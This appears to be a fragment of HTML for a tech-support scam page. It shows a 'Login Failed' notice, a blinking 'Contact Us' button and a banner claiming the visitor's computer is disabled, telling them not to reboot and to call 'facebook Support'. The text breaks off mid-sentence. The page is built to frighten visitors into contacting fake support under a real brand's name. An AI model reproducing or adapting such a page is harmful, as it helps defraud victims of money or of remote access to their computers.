    ...
    <div class="login_div bg-light d-flex justify-content-center align-items-center">
        <div class="container">
            <div class="d-flex align-items-center">
                <div class="me-3"> <img src="assets/img/error.png" alt="error" srcset="assets/img/error.png"
                        width="50px"></div>
                <div>
                    <h3>Login Failed</h3>
            ...
            <div class="text-end">
                <button class="btn btn-primary px-4 blink" type="button" data-bs-toggle="modal"
                    data-bs-target="#contact_us_Modal">Contact Us</button>
            </div>
        </div>
    </div>
    <div class="text-light buttom_div p-2 text-center bg_reboot">
        <h5>Do not reboot or use Your computer.</h5>
        <p>Your computer is disabled. Please, call facebook Support. <br> Access is the block security reason for this
